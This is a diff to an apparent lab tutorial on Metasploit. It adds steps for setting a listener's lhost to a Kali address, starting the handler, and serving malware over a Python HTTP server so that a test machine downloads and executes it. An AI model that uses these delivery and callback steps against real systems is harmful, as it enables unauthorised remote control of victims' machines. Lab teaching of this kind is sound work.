@@ -130,11 +130,17 @@ To listen to the port we have configured, in our malware, we need a handler, so 
 - Type options to see the changed payload
 
 Now, change the lhost to Kali
-- Enter *set lhost 192.168.20.11*
-- 
+- Enter ***set lhost 192.168.20.11***
+  
 Now we can start the handler
 - Enter *exploit*
-and listen in, and wait for the test machine to download and execute our malware. 
+and listen in, and wait for the test machine to download and execute our malware.
+
+For our test machine to download the malware, we have to set the HTTP server using Python in Kali
+- be in the same directory as our malware
+- terminal -> python3 -m http.server 9999 (use a port that is not in use)
+
+This allows the test machine to act as a Kali machine and start downloading the malware.
 
 
 
